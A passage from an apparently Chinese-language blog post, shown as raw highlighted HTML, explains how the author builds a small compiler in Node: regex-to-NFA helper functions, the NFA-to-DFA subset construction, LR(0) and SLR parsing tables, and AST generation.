class="hljs-type">int</span> <span class="hljs-title function_">feb</span><span class="hljs-params">(x: <span class="hljs-type">int</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> x;<br>  &#125;<br>  <span class="hljs-keyword">return</span> x + feb(x<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来从以下几个方面介绍：</p><ol type="1"><li>parser：包含正则表达式生成和词法token生成</li><li>semantic：文法推导式解析和抽象语义树生成</li><li>check：语法和类型校验</li><li>gen：汇编代码生成</li></ol><h2 id="parser">parser</h2><p>在词法分析阶段，输入是字符串，输出是 token流，一开始设计输出是枚举值的数组，类似这样:<code>[TYPE, ID, BRACE, ...]</code>，但是这样会有问题，因为词素值没办法保留下来，所以后面改成了如下输出:<code>[(line_num, TYPE, int), (line_num, ID, feb)]</code>，(行号，类型,词素值)三元组 学在构建自动机过程中，自动机把输入流转成token流，比如当词法分析器读完 int 的时候，这时候就会返回一个 TYPEtoken，但是如果是 int1，就应该返回一个 IDtoken，所以这里涉及到贪婪读取，另外对于像 if这种关键字，如果同时满足多种终结状态，应该涉及到优先级，这里的优先级比较简单，直接遍历终态节点数组endStates(可以理解为叶子节点)，遇到第一个符合的即返回，所以正则的优先级和前后顺序有关；</p><p>那么如何构建自动机？我们的目标是构建一系列单个正则表达式单元nfa，然后联合成一个大的nfa单元，这个nfa可以解析我们的之前正则单元，再得到联合nfa的邻接矩阵edges，最后根据edges转成dfa，具体步骤如下：</p><p>首先，需要名明确的是，我们的词法分析器支持以下几个单元： +: a+, <em>:a</em>, 连接: ab， 逻辑或: a|b， 字符集: [a-z]支持少部分字符转义，如：, t, </p><p>如何把正则表达式构建为nfa：对于每一个单元正则表达式，可以直接生成对应的节点，但是有些问题我们需要注意：我们的输入是一个个正则表达式，正则表达式本身可以理解为是一个个单元，而这些单元又可能是字符或者其他单元和成的，如：a|b 就是一个单元，但是其组成就是 2 个字符 [a-z]|a就是一个元外加一个普通字符另外对于中括号这种还需要特殊处理，思路如下：即使是单个字符也会抽象成节点的概念，另外在生成自动机的过程中，由于存在[]，+，*等等这样的修饰符号，考虑使用stack进行存储，类比括号匹配算法。(<code>lib =&gt; parser =&gt; nfa =&gt; flex函数</code>)</p><h3 id="构建基本正则单元">构建基本正则单元</h3><p>我们可以提供相应的函数，我们的词法分析器包含以下几种基本正则单元：</p><ol type="1"><li>连接运算符</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>: VertexNode, to: VertexNode</span>): <span class="hljs-title class_">VertexNode</span> &#123;<br>  <span class="hljs-comment">// from的尾和to的头相互连接,注意circle</span><br>  <span class="hljs-keyword">let</span> cur = graph.<span class="hljs-title function_">getVertex</span>(<span class="hljs-keyword">from</span>.<span class="hljs-property">index</span>); <span class="hljs-comment">// 获取邻接表</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">memo</span>: number[] = [];<br>  <span class="hljs-keyword">while</span> (cur.<span class="hljs-property">firstEdge</span> &amp;&amp; !memo.<span class="hljs-title function_">includes</span>(cur.<span class="hljs-property">index</span>)) &#123;<br>    memo.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">index</span>);<br>    cur = graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">index</span>);<br>  &#125;<br><br>  graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">index</span>).<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<br>    to.<span class="hljs-property">index</span>,<br>    graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">index</span>).<span class="hljs-property">firstEdge</span><br>  );<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">from</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>或</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">or</span>(<span class="hljs-params">a: VertexNode, b: VertexNode</span>): <span class="hljs-title class_">VertexNode</span> &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(a.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, a.<span class="hljs-property">edgeVal</span> || <span class="hljs-literal">null</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">next</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(b.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, b.<span class="hljs-property">edgeVal</span> || <span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> nodeEnd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeEnd, nodeEnd.<span class="hljs-property">index</span>);<br>  <span class="hljs-title function_">connect</span>(a, nodeEnd);<br>  <span class="hljs-title function_">connect</span>(b, nodeEnd);<br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3" type="1"><li>字符集</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">characters</span>(<span class="hljs-params">chars: string[]</span>) &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">const</span> nodeEnd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>, chars);<br>  <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(nodeEnd.<span class="hljs-property">index</span>, chars);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(tmp, tmp.<span class="hljs-property">index</span>);<br><br>  <span class="hljs-keyword">const</span> pre = nodeStart.<span class="hljs-property">firstEdge</span>;<br>  nodeStart.<span class="hljs-property">firstEdge</span> = nodeEnd;<br>  nodeEnd.<span class="hljs-property">next</span> = pre;<br><br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4" type="1"><li>*修饰符</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">mutipliy</span>(<span class="hljs-params">wrapped: VertexNode</span>): <span class="hljs-title class_">VertexNode</span> &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(wrapped.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = tmp;<br>  <span class="hljs-keyword">let</span> cur = graph.<span class="hljs-title function_">getVertex</span>(wrapped.<span class="hljs-property">index</span>); <span class="hljs-comment">// 获取邻接表</span><br>  <span class="hljs-keyword">while</span> (cur.<span class="hljs-property">firstEdge</span>) &#123;<br>    cur = graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">index</span>);<br>  &#125;<br>  <span class="hljs-title function_">connect</span>(cur, nodeStart);<br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5" type="1"><li>+修饰符</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">plus</span>(<span class="hljs-params">base: VertexNode</span>) &#123;<br>  <span class="hljs-comment">// 基于old新建节点</span><br>  <span class="hljs-keyword">let</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, base.<span class="hljs-property">edgeVal</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = base.<span class="hljs-property">firstEdge</span>;<br>  <span class="hljs-keyword">const</span> res = nodeStart;<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">let</span> cur = base?.<span class="hljs-property">firstEdge</span>;<br>  <span class="hljs-keyword">while</span> (cur) &#123;<br>    <span class="hljs-keyword">const</span> vertexNode = graph.<span class="hljs-title function_">getVertex</span>(cur?.<span class="hljs-property">index</span>);<br>    <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, vertexNode.<span class="hljs-property">edgeVal</span>);<br>    nodeStart.<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(tmp.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, vertexNode.<span class="hljs-property">edgeVal</span>);<br>    nodeStart = tmp;<br>    tmp.<span class="hljs-property">firstEdge</span> = base.<span class="hljs-property">firstEdge</span>;<br>    graph.<span class="hljs-title function_">addVertexNode</span>(tmp, tmp.<span class="hljs-property">index</span>);<br>    cur = vertexNode.<span class="hljs-property">firstEdge</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">mutipliy</span>(res);<br>&#125;<br></code></pre></td></tr></table></figure><p>不过比较困扰的是这些节点的数据结构如何存储是一件要考虑周到的事：需要节点id，由于自动机是有向图，并且可能带环，并且节点和节点之间可能存在不止一条边，考虑了下，还是用邻接表存储(主要是第一版的代码是这样的，再加上如果感觉节点之间的连接可能在某些情况下比较少，临界矩阵比较浪费内存)，firstEdge指向其所有的临界边，edgeVal 是边上的值，对于该图的搜索，使用bfs+dfs+检测环。</p><p>if对应的nfa: <img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104727865.png" class=""></p><p>[a-z][a-z0-9]* 的nfa为: <img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104740056.png" class=""></p><p>联合后就变成了一个大的nfa，并在终态节点上放置一些动作：<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104921040.png" class=""></p><h3 id="构建邻接矩阵">构建邻接矩阵：</h3><p><code>lib =&gt; parser =&gt; nfa =&gt; build_edges函数</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> edges = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_item</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>);<br>&#125;);<br>edges[起始点][终止点] = [边集合]，如果是epsilon，则是<span class="hljs-literal">null</span><br><span class="hljs-title function_">build_edges</span>() dfs + bfs + 集合去重<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],   ======&gt; <span class="hljs-number">0</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, i, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">1</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, f, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">2</span><br>[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]======&gt; <span class="hljs-number">3</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,======&gt; <span class="hljs-number">4</span><br>    [<br>       a,  b,  c, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>,<br>      <span class="hljs-number">103</span>, <span class="hljs-number">104</span>, <span class="hljs-number">105</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">108</span>,<br>      <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">111</span>, <span class="hljs-number">112</span>, <span class="hljs-number">113</span>, <span class="hljs-number">114</span>,<br>      <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">119</span>, <span class="hljs-number">120</span>,<br>      <span class="hljs-number">121</span>, z<br>    ],<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>  ],<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">5</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,======&gt; <span class="hljs-number">6</span><br>    [<br>       a,  b,  c, d, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>, <span class="hljs-number">103</span>, <span class="hljs-number">104</span>,<br>      <span class="hljs-number">105</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">108</span>, <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">111</span>, <span class="hljs-number">112</span>,<br>      <span class="hljs-number">113</span>, <span class="hljs-number">114</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">119</span>, <span class="hljs-number">120</span>,<br>      <span class="hljs-number">121</span>, z,  <span class="hljs-number">0</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">5</span>,<br>       <span class="hljs-number">6</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">9</span><br>    ],<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>  ],<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">7</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">8</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]======&gt; <span class="hljs-number">9</span><br>]<br></code></pre></td></tr></table></figure><p>可以验证下就是如下节点边值对(行索引对应source节点，列索引对应target节点，矩阵值就是边集合)：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>=&gt; <span class="hljs-number">2</span>: i<br><br><span class="hljs-symbol">1 </span>=&gt; <span class="hljs-number">4</span>: null<br><br><span class="hljs-symbol">2 </span>=&gt; <span class="hljs-number">3</span>: f<br><br><span class="hljs-number">4</span>=&gt;<span class="hljs-number">5</span>: [a-z]<br><br><span class="hljs-number">5</span>=&gt;<span class="hljs-number">8</span>: null<br><br><span class="hljs-number">6</span>=&gt;<span class="hljs-number">7</span>: [a-z] [<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]<br><br><span class="hljs-number">7</span>=&gt;<span class="hljs-number">8</span>: null<br><br><span class="hljs-number">8</span>=&gt;<span class="hljs-number">6</span>: null<br></code></pre></td></tr></table></figure><h3 id="根据邻接矩阵构建dfa">根据邻接矩阵构建dfa</h3><p><span class="math display">\[Closure(S):S的可达闭包，表示从集合S出发，无需接受任何字符，即只通过epsilon边即可到达的状态组成的集合\\Closure(S) = S \cup(\bigcup_{m\in{S}}edge(m, \epsilon))，其中edge(m, \epsilon)\\表示从状态m出发沿着边c可到达的所有NFA状态的集合\]</span></p><p><span class="math display">\[假设状集合有如下几个状态：S=\{m, n, k\} \\从S的状态出发，沿着某条边c可到达的新的状态集合，表示为DFAedge(S, c) \\DFAedge(S, c) = Closure(\bigcup_{k\in{S}}edge(k, c))\]</span></p><p>有了Closure和DFAedge算法单元，这样从NFA的起点出发，不断的更新DFAedge(S,c)，每次新生成的DFAedge(S,c)，即得到DFA里的状态节点，据此得到dfa状态转移表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">states<span class="hljs-selector-attr">[0]</span> &lt;- <span class="hljs-selector-attr">[]</span> <br>states<span class="hljs-selector-attr">[1]</span> &lt;- <span class="hljs-built_in">Closure</span>(<span class="hljs-selector-attr">[S]</span>)<br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-number">1</span>, j &lt;- <span class="hljs-number">0</span> <br>while j &lt;= <span class="hljs-selector-tag">p</span> <br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> 字母集 <br>e &lt;- <span class="hljs-built_in">DFAedge</span>(states<span class="hljs-selector-attr">[j]</span>, c) <br><span class="hljs-keyword">if</span> e == states<span class="hljs-selector-attr">[i]</span> <span class="hljs-keyword">for</span> some <span class="hljs-selector-tag">i</span> &lt;= <span class="hljs-selector-tag">p</span> <br>then trans<span class="hljs-selector-attr">[j]</span><span class="hljs-selector-attr">[c]</span> &lt;- <span class="hljs-selector-tag">i</span><br><span class="hljs-keyword">else</span> <br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-selector-tag">p</span> + <span class="hljs-number">1</span><br>states<span class="hljs-selector-attr">[p]</span> &lt;- e<br>trans<span class="hljs-selector-attr">[j]</span><span class="hljs-selector-attr">[c]</span> &lt;- <span class="hljs-selector-tag">p</span><br>j &lt;- j + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>构建完正则表达式之后就可以对我们的输入处理成token流了。(<code>lib =&gt; scan函数</code>)</p><h2 id="构建抽象语法树">构建抽象语法树</h2><p>这里我用的是简单的LR(0)上下无关文法，关于什么是上下无关文什么是有关文，请戳-&gt;,</p><p>理论上上下无关文法所代表的文法范围： LR(1) &gt; LSPR &gt; SLR &gt;LR(0) <strong>LR(0):</strong> 没有提前预测的符号，容易出现 shift-reduce冲突以及 reduce-reduce 冲突，所以需要设计适合的文法；<strong>SLR:</strong> 有简单的预测，可以用follow集解决部分shift-reduce冲突，但是在有些情况下还是 shift-reduce冲突 <strong>LR(1):</strong>可以解决 shift-reduce 冲突，也解决 reduce-reduce 冲突<strong>LSPR:</strong> 由于 LR(1)的表特别大，在此基础上做了优化</p><p>看如下文法的 LR(0)生成过程：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">E-&gt; Program $<br>P<span class="hljs-function"><span class="hljs-title">rogram</span> -&gt;</span> Assign == Assign<br>A<span class="hljs-function"><span class="hljs-title">ssign</span> -&gt;</span> Assign + Token<br>A<span class="hljs-function"><span class="hljs-title">ssign</span> -&gt;</span> Token<br>T<span class="hljs-function"><span class="hljs-title">oken</span> -&gt;</span> id<br></code></pre></td></tr></table></figure><p>LR(0)dfa</p><p><img src="../飞书20230430-125517.jpg" /></p><p>LR(0)对应的状态转移表： <img src="../飞书20230430-124728.jpg" /></p><p>可以看到在状态 9 是存在移位-规约冲突的，这是因为LR(0)默认在所有的终结符号处做规约。</p><p>slr 语法是比LR(0),更为广泛的一种语法，它只在特定的地方放置规约动作。具体来说，在上面的例子里，在状态9 处，只有规约式 1 的移位指针到达里末尾，所以可以看下规约式 1后面可能会紧接着什么符号，也就是 followSet(Program) ={$}，所以只在$处放置规约动作。 下面是 slr 分析表： <imgsrc="../飞书20230430-163301.jpg" /></p><h2 id="五ast生成">五、AST生成</h2><p>生成好分析表之后，就可以根据分析表进行语法分析了，如下所示，在提前定义好的文法产生式做对应的规约动作，如下case0就是<code>Formals -&gt; int,TOKEN.ID</code>，在这里利用栈内的元素生成Formal_Class；就这样每次在对应的文法产生式上对对应的做规约动作，从而完成自底向上的ast的构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs node">[Formals -&gt; int, TOKEN.ID]: 0,<br>[Formals -&gt; Formals, &#x27;,&#x27;, int, TOKEN.ID]: 1<br><br>case 0:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2]);<br>  break;<br>case 1:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2], yyvalsp[3]);<br>  break;<br><br></code></pre></td></tr></table></figure><p>下图简单模拟了<code>int ID (int ID)</code>的token流处理过程，<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/stack.gif" class="" title="这是一张图片">在没有规约动作的时候token一直push进栈，直到有对应的规约动作，这个时候按照指定的规约动作，生成非终结符，再把该非终结符放入栈内，重复进行，直到栈内为空或者遇到了$，当然，如果在这过程中遇到了不合法的字符，直接抛出异常</p><p>以及生成的简单ast如下： <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 